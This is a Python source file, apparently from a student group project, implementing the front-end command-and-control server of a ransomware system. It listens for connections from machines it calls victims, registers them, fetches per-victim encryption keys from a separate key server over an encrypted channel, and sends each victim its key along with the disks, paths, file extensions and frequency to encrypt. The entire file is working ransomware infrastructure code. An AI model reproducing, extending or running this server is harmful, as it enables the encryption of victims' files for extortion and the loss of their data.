import threading
import utile.security as security
import queue
import socket
from threading import Thread
import utile.config as configg
import utile.message as message
from utile.network import recv_msg, send_msg, recv_msg_clear, send_msg_clear


status_victims = {}
lock = threading.Lock()

class serveur_frontal(object):

    def __init__(self, ip, port):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port

    def start_server(self):
        global config_serveur
        global config_workstation
        configg.load_config("C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/config.json", "C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/config.key")
        self.ip_cles, self.port_cles = configg.get_data_config("ip_cles"), configg.get_data_config("port_cles")
        config_serveur = configg.load_config('C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/server.json', 'C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/server.key')
        config_workstation = configg.load_config('C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/workstation.json', 'C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/serveur_frontale/configs/workstation.key')
        queue_messages_receiv = queue.Queue()
        thread_s_cles = Thread(target=self.thread_srv_cles, args=(queue_messages_receiv,))
        thread_s_cles.start()

        queue_messages_receiv.get()
        print(f'Connection entre le serveur frontale et le serveur de clés effectuée')
        queue_messages_receiv.task_done()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        s.listen(10)
        print(f'$-F: Server started ! Waiting for clients...')
        while True:
            c_v, a_v = s.accept()
            print(f'Nouvelle victime : {a_v}')
            queue_victim = queue.Queue()
            t_v = Thread(target=self.thread_ransomware, args=(c_v, queue_messages_receiv, queue_victim,))
            t_v.start()
        s.close()

    def thread_srv_cles(self, q_messages_receiv):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip_cles, self.port_cles))

        key_f = security.diffie_hellman_recv_key(s)
        q_messages_receiv.put('CONN_SRV_CLES')
        q_messages_receiv.join()

        while True:
            msg = q_messages_receiv.get()
            if 'queue' in msg.keys():
                queue_response = msg['queue']
                msg.pop('queue')  # Retire la clé 'queue' du dictionnaire msg
            if "INITIALIZE_REQ" in msg:
                send_msg(s, msg, key_f)
                rsp = recv_msg(s, key_f)
                if "INITIALIZE_KEY" in rsp:
                    queue_response.put(rsp)


    def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
        global config_serveur
        global config_workstation
        while True:
            msg = recv_msg_clear(c_v)
            if "INITIALIZE_REQ" in msg:
                lock.acquire()
                if msg['INITIALIZE'] in status_victims.keys():
                    print(f"{msg['INITIALIZE']}")
                    lock.release()
                else:
                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
                    lock.release()
                msg['queue'] = queue_victim
                queue_messages_receiv.put(msg)
                key_rsp = queue_victim.get()
                if msg['OS'] == 'SERVEUR':
                    config_ransomware = config_serveur
                else:
                    config_ransomware = config_workstation
                msg = message.get_message('initialize_resp', [
                    key_rsp['KEY_RESP'],
                    config_ransomware['DISKS'],
                    config_ransomware['PATHS'],
                    config_ransomware['FILE_EXT'],
                    config_ransomware['FREQ'],
                    key_rsp['KEY']
                ])
                send_msg_clear(c_v, msg)